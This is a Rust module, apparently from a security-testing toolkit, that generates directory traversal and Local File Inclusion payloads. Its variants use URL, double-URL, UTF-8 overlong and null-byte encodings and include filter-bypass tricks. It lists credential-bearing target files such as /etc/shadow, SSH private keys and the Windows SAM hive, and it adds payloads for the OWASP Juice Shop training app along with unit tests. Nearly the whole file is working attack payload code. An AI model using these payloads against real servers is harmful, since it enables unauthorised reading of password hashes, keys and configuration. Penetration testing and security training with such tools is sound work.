//! Path traversal payload generation
//!
//! Provides directory traversal and Local File Inclusion (LFI) payloads.

/// Path traversal payload with description
#[derive(Debug, Clone)]
pub struct TraversalPayload {
    pub name: String,
    pub payload: String,
    pub encoding: TraversalEncoding,
}

#[derive(Debug, Clone, PartialEq)]
pub enum TraversalEncoding {
    None,
    UrlEncoded,
    DoubleUrlEncoded,
    Utf8,
    NullByte,
    Mixed,
}

impl TraversalPayload {
    pub fn new(
        name: impl Into<String>,
        payload: impl Into<String>,
        encoding: TraversalEncoding,
    ) -> Self {
        Self {
            name: name.into(),
            payload: payload.into(),
            encoding,
        }
    }
}

/// Generate basic path traversal sequences
pub fn basic_traversals(depth: usize, target_file: &str) -> Vec<TraversalPayload> {
    let sequence = "../".repeat(depth);
    vec![
        TraversalPayload::new("Unix style", format!("{}{}", sequence, target_file), TraversalEncoding::None),
        TraversalPayload::new("Windows style", format!("{}{}", sequence.replace("/", "\\"), target_file), TraversalEncoding::None),
        TraversalPayload::new("Mixed slashes", format!("{}{}", sequence.replace("../", "..\\"), target_file), TraversalEncoding::None),
    ]
}

/// URL encoded traversal variants
pub fn url_encoded_traversals(depth: usize, target_file: &str) -> Vec<TraversalPayload> {
    let base_seq = "../".repeat(depth);
    vec![
        TraversalPayload::new(
            "URL encoded /",
            format!("{}{}", base_seq.replace("/", "%2f"), target_file),
            TraversalEncoding::UrlEncoded,
        ),
        TraversalPayload::new(
            "URL encoded .",
            format!("{}{}", base_seq.replace(".", "%2e"), target_file),
            TraversalEncoding::UrlEncoded,
        ),
        TraversalPayload::new(
            "Double URL encoded /",
            format!("{}{}", base_seq.replace("/", "%252f"), target_file),
            TraversalEncoding::DoubleUrlEncoded,
        ),
        TraversalPayload::new(
            "Double URL encoded .",
            format!("{}{}", base_seq.replace(".", "%252e"), target_file),
            TraversalEncoding::DoubleUrlEncoded,
        ),
        TraversalPayload::new(
            "URL encoded backslash",
            format!("{}{}", base_seq.replace("/", "%5c"), target_file),
            TraversalEncoding::UrlEncoded,
        ),
    ]
}

/// Null byte injection payloads (for bypassing extension checks)
pub fn null_byte_traversals(depth: usize, target_file: &str, allowed_ext: &str) -> Vec<TraversalPayload> {
    let sequence = "../".repeat(depth);
    vec![
        TraversalPayload::new(
            "Null byte terminator",
            format!("{}{}\x00.{}", sequence, target_file, allowed_ext),
            TraversalEncoding::NullByte,
        ),
        TraversalPayload::new(
            "URL encoded null byte",
            format!("{}{}%00.{}", sequence, target_file, allowed_ext),
            TraversalEncoding::NullByte,
        ),
        TraversalPayload::new(
            "Double URL encoded null byte",
            format!("{}{}%2500.{}", sequence, target_file, allowed_ext),
            TraversalEncoding::NullByte,
        ),
    ]
}

/// UTF-8 encoded traversal variants
pub fn utf8_traversals(depth: usize, target_file: &str) -> Vec<TraversalPayload> {
    let sequence = "../".repeat(depth);
    vec![
        TraversalPayload::new(
            "UTF-8 overlong /",
            format!("{}{}", sequence.replace("/", "%c0%af"), target_file),
            TraversalEncoding::Utf8,
        ),
        TraversalPayload::new(
            "UTF-8 overlong .",
            format!("{}{}", sequence.replace(".", "%c0%ae"), target_file),
            TraversalEncoding::Utf8,
        ),
        TraversalPayload::new(
            "UTF-8 .",
            format!("{}{}", sequence.replace(".", "\u{FF0E}"), target_file),
            TraversalEncoding::Utf8,
        ),
        TraversalPayload::new(
            "UTF-8 /",
            format!("{}{}", sequence.replace("/", "\u{FF0F}"), target_file),
            TraversalEncoding::Utf8,
        ),
    ]
}

/// Filter bypass techniques
pub fn filter_bypass_traversals(target_file: &str) -> Vec<TraversalPayload> {
    vec![
        TraversalPayload::new(
            "....// bypass",
            format!("....//....//....//....//....//....//....//....//....//..../{}", target_file),
            TraversalEncoding::Mixed,
        ),
        TraversalPayload::new(
            "..;/ bypass (Tomcat)",
            format!("..;/..;/..;/..;/..;/..;/..;/..;/{}", target_file),
            TraversalEncoding::Mixed,
        ),
        TraversalPayload::new(
            "Double dot bypass",
            format!("..././..././..././..././{}", target_file),
            TraversalEncoding::Mixed,
        ),
        TraversalPayload::new(
            "Absolute path",
            format!("/{}", target_file),
            TraversalEncoding::None,
        ),
        TraversalPayload::new(
            "file:// protocol",
            format!("file:///{}", target_file),
            TraversalEncoding::None,
        ),
    ]
}

/// Common sensitive files to target
pub fn common_targets_unix() -> Vec<&'static str> {
    vec![
        "etc/passwd",
        "etc/shadow",
        "etc/hosts",
        "etc/hostname",
        "etc/group",
        "etc/resolv.conf",
        "etc/nginx/nginx.conf",
        "etc/apache2/apache2.conf",
        "proc/self/environ",
        "proc/self/cmdline",
        "proc/version",
        "var/log/auth.log",
        "var/log/syslog",
        "root/.bash_history",
        "root/.ssh/id_rsa",
        "root/.ssh/authorized_keys",
        "home/user/.ssh/id_rsa",
    ]
}

/// Common sensitive files for Windows
pub fn common_targets_windows() -> Vec<&'static str> {
    vec![
        "Windows/System32/drivers/etc/hosts",
        "Windows/System32/config/SAM",
        "Windows/System32/config/SYSTEM",
        "Windows/repair/SAM",
        "Windows/win.ini",
        "inetpub/wwwroot/web.config",
        "Users/Administrator/Desktop/",
    ]
}

/// Juice Shop specific traversal payloads
pub fn juice_shop_traversal() -> Vec<TraversalPayload> {
    vec![
        TraversalPayload::new(
            "FTP backup file (null byte)",
            "/ftp/package.json.bak%2500.md",
            TraversalEncoding::NullByte,
        ),
        TraversalPayload::new(
            "Easter egg file (null byte)",
            "/ftp/eastere.gg%2500.md",
            TraversalEncoding::NullByte,
        ),
        TraversalPayload::new(
            "Coupon file (null byte)",
            "/ftp/coupons_2013.md.bak%2500.md",
            TraversalEncoding::NullByte,
        ),
        TraversalPayload::new(
            "Error log (null byte)",
            "/ftp/suspicious_errors.yml%2500.md",
            TraversalEncoding::NullByte,
        ),
        TraversalPayload::new(
            "Quarantine folder",
            "/ftp/quarantine/",
            TraversalEncoding::None,
        ),
        TraversalPayload::new(
            "Support logs",
            "/support/logs",
            TraversalEncoding::None,
        ),
        TraversalPayload::new(
            "Access log",
            "/support/logs/access.log",
            TraversalEncoding::None,
        ),
    ]
}

/// Generate all traversal variants for a target file
pub fn all_traversal_variants(target_file: &str, allowed_ext: &str) -> Vec<TraversalPayload> {
    let mut payloads = Vec::new();

    for depth in 1..=10 {
        payloads.extend(basic_traversals(depth, target_file));
        payloads.extend(url_encoded_traversals(depth, target_file));
        payloads.extend(null_byte_traversals(depth, target_file, allowed_ext));
        payloads.extend(utf8_traversals(depth, target_file));
    }

    payloads.extend(filter_bypass_traversals(target_file));
    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_traversals() {
        let payloads = basic_traversals(3, "etc/passwd");
        assert_eq!(payloads.len(), 3);
        assert!(payloads[0].payload.contains("../../../etc/passwd"));
    }

    #[test]
    fn test_url_encoded_traversals() {
        let payloads = url_encoded_traversals(2, "etc/passwd");
        assert!(payloads.iter().any(|p| p.payload.contains("%2f")));
        assert!(payloads.iter().any(|p| p.payload.contains("%2e")));
    }

    #[test]
    fn test_null_byte_traversals() {
        let payloads = null_byte_traversals(3, "etc/passwd", "pdf");
        assert!(payloads.iter().any(|p| p.payload.contains("%00")));
        assert!(payloads.iter().any(|p| p.payload.contains("%2500")));
    }

    #[test]
    fn test_filter_bypass() {
        let payloads = filter_bypass_traversals("etc/passwd");
        assert!(payloads.iter().any(|p| p.payload.contains("..../")));
    }

    #[test]
    fn test_juice_shop_traversal() {
        let payloads = juice_shop_traversal();
        assert!(payloads.iter().any(|p| p.payload.contains("package.json.bak")));
        assert!(payloads.iter().any(|p| p.payload.contains("%2500")));
    }

    #[test]
    fn test_common_targets() {
        let unix_targets = common_targets_unix();
        assert!(unix_targets.contains(&"etc/passwd"));

        let win_targets = common_targets_windows();
        assert!(win_targets.iter().any(|t| t.contains("hosts")));
    }
}
